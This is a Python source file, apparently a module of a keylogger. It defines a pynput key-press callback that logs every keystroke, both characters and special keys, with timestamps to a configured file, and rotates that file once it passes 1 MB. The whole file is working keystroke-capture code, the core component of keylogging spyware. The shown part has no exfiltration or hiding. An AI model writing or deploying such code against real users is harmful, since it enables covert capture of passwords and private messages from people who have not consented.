import os
from datetime import datetime
from pynput import keyboard
from config import KEYLOG_FILE

MAX_SIZE = 1_000_000  # 1MB rotation threshold

def rotate_file_if_needed():
    if os.path.exists(KEYLOG_FILE) and os.path.getsize(KEYLOG_FILE) > MAX_SIZE:
        base, ext = os.path.splitext(KEYLOG_FILE)
        rotated = f"{base}_old{ext}"
        os.rename(KEYLOG_FILE, rotated)

def key_pressed(key):
    """Log pressed keys with timestamps and basic rotation."""
    rotate_file_if_needed()

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        char = key.char
        if char:
            entry = f"{timestamp} - {char}\n"
        else:
            return
    except AttributeError:
        entry = f"{timestamp} - <{key}>\n"

    try:
        with open(KEYLOG_FILE, "a") as log_key:
            log_key.write(entry)
    except IOError as e:
        print(f"File error: {e}")
